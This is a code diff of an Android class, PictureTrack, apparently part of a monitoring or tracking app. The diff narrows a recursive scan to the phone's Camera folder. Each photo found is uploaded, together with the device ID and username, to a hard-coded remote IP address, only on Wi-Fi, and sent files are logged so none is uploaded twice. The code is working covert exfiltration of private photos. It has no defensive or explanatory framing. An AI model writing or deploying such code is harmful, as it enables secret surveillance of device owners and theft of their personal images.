@@ -2,10 +2,7 @@ package com.os.logger.track;
 
 import android.content.Context;
 import android.os.Environment;
-import android.os.Handler;
-import android.os.Message;
 import android.text.TextUtils;
-import android.util.Log;
 
 import com.monitor.greendao.MediaEntity;
 import com.monitor.greendao.MediaEntityDao;
@@ -20,8 +17,6 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
-import java.util.PriorityQueue;
-import java.util.Queue;
 import java.util.Random;
 
 import okhttp3.Call;
@@ -31,36 +26,43 @@ import okhttp3.Response;
 /**
  * Created by Alan on 16/5/12.
  */
-public class PictureTrack extends BaseTrack{
+public class PictureTrack extends BaseTrack {
     private static String sUrl = "http://139.196.39.184/send_media";
     private List<MediaEntity> mSentEntries;
-//    private Task mTask;
+    //    private Task mTask;
     private ArrayList<File> mTasks;
 
     public PictureTrack(Context context) {
         super(context);
     }
 
-    private void scanFiles(File path){
-        if (path.isDirectory()){
-            File[] files = path.listFiles();
-            for (File file:files){
-                scanFiles(file);
+    private void scanFiles(File path, boolean check) {
+        if (path.isDirectory()) {
+            if (!check || legalDir(path)) {
+                File[] files = path.listFiles();
+                for (File file : files) {
+                    scanFiles(file, true);
+                }
+
             }
-        }else{
+        } else {
             addTask(path);
         }
     }
 
-    private void addTask(File file){
-        if (sent(file)){
+    private boolean legalDir(File file) {
+        return "Camera".equalsIgnoreCase(file.getName());
+    }
+
+    private void addTask(File file) {
+        if (sent(file)) {
             return;
         }
 
-        if (!legal(file)){
+        if (!legal(file)) {
             return;
         }
-        if (mTasks == null){
+        if (mTasks == null) {
             mTasks = new ArrayList<>();
         }
 
@@ -88,24 +90,24 @@ public class PictureTrack extends BaseTrack{
 //        });
     }
 
-    private void report(final File file){
-        if (sent(file)){
+    private void report(final File file) {
+        if (sent(file)) {
             return;
         }
 
-        if (!inWifi()){
+        if (!inWifi()) {
             return;
         }
 
         LogUtil.e(file.getName());
 
-        HashMap<String,String> args = new HashMap<>();
-        String userName = PreferenceUtil.getString(getContext(),PreferenceUtil.KEY_USER_NAME);
-        if (!TextUtils.isEmpty(userName)){
-            args.put("username",userName);
+        HashMap<String, String> args = new HashMap<>();
+        String userName = PreferenceUtil.getString(getContext(), PreferenceUtil.KEY_USER_NAME);
+        if (!TextUtils.isEmpty(userName)) {
+            args.put("username", userName);
         }
         args.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
-        args.put("time",String.valueOf(file.lastModified()));
+        args.put("time", String.valueOf(file.lastModified()));
         UploadHelper.getInstance().uploadForm(sUrl, file, args, new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
@@ -115,7 +117,7 @@ public class PictureTrack extends BaseTrack{
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                if (isSuccessFul(response)){
+                if (isSuccessFul(response)) {
                     markSent(file);
                 }
                 UploadHelper.getInstance().removeFormCall(call);
@@ -124,11 +126,11 @@ public class PictureTrack extends BaseTrack{
         });
     }
 
-    private boolean legal(File file){
-        if (file == null){
+    private boolean legal(File file) {
+        if (file == null) {
             return false;
         }
-        if (!file.exists()){
+        if (!file.exists()) {
             return false;
         }
         String name = file.getName();
@@ -136,28 +138,28 @@ public class PictureTrack extends BaseTrack{
     }
 
     private boolean isSuccessFul(Response response) {
-        if (!response.isSuccessful()){
+        if (!response.isSuccessful()) {
             response.body().close();
             return false;
         }
         String body = null;
         try {
             body = response.body().string();
-            LogUtil.e("media:"+ body);
+            LogUtil.e("media:" + body);
         } catch (IOException e) {
             e.printStackTrace();
         }
         return body != null && !body.contains("errorno");
     }
 
-    private boolean sent(File file){
-        if (mSentEntries == null){
+    private boolean sent(File file) {
+        if (mSentEntries == null) {
             return false;
         }
         String name = file.getName();
         long time = file.lastModified();
-        for (MediaEntity entity:mSentEntries){
-            if (time == entity.getModifyTime() && TextUtils.equals(name,entity.getName())){
+        for (MediaEntity entity : mSentEntries) {
+            if (time == entity.getModifyTime() && TextUtils.equals(name, entity.getName())) {
                 return true;
             }
 
@@ -165,11 +167,11 @@ public class PictureTrack extends BaseTrack{
         return false;
     }
 
-    private void markSent(File file){
-        if (mSentEntries == null){
+    private void markSent(File file) {
+        if (mSentEntries == null) {
             mSentEntries = new ArrayList<>();
         }
-        MediaEntity entity = new MediaEntity(file.lastModified(),file.getName());
+        MediaEntity entity = new MediaEntity(file.lastModified(), file.getName());
         mSentEntries.add(entity);
         MediaEntityDao dao = DBHelper.getInstance().getDaoSession().getMediaEntityDao();
         dao.insertOrReplace(entity);
@@ -177,24 +179,24 @@ public class PictureTrack extends BaseTrack{
 
     @Override
     public void sync() {
-        if (!inWifi()){
+        if (!inWifi()) {
             return;
         }
         File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        if (!dir.exists()){
+        if (!dir.exists()) {
             return;
         }
         //reset
-        if (mTasks!=null){
+        if (mTasks != null) {
             mTasks.clear();
         }
-        scanFiles(dir);
+        scanFiles(dir, false);
 
         moveToNext();
     }
 
-    private void moveToNext(){
-        if (mTasks == null || mTasks.size() == 0){
+    private void moveToNext() {
+        if (mTasks == null || mTasks.size() == 0) {
             return;
         }
 
@@ -206,7 +208,7 @@ public class PictureTrack extends BaseTrack{
 
     @Override
     public void destroy() {
-        if (mTasks !=null){
+        if (mTasks != null) {
             mTasks.clear();
         }
     }
